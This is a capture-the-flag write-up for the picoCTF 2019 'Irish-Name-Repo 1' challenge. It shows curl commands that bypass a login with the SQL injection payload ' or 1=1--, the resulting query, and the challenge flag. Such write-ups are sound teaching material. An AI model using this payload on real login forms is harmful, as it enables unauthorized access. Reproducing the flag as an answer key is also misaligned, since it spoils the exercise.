## Description:
> There is a website running at http://2019shell1.picoctf.com:4162. Do you think you can log us in? Try to see if you can login!
## Solution: 
The website offered an admin login page:
```html
            Username:
            Password:
```
In order to bypass the authentication logic, all we needed to do is provide a classic SQLi string:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_1# curl "https://2019shell1.picoctf.com/problem/4162/login.php" --data "username=admin&password='+or+1=1--" && echo
Logged in!Your flag is: picoCTF{s0m3_SQL_96ab211c}
```
It was also possible to set the `debug` parameter in order to inspect the SQL statement:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_1# curl "https://2019shell1.picoctf.com/problem/4162/login.php" --data "username=admin&password='+or+1=1--&debug=1" && echo
username: admin
password: ' or 1=1--
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1=1--'
Logged in!Your flag is: picoCTF{s0m3_SQL_96ab211c}
```
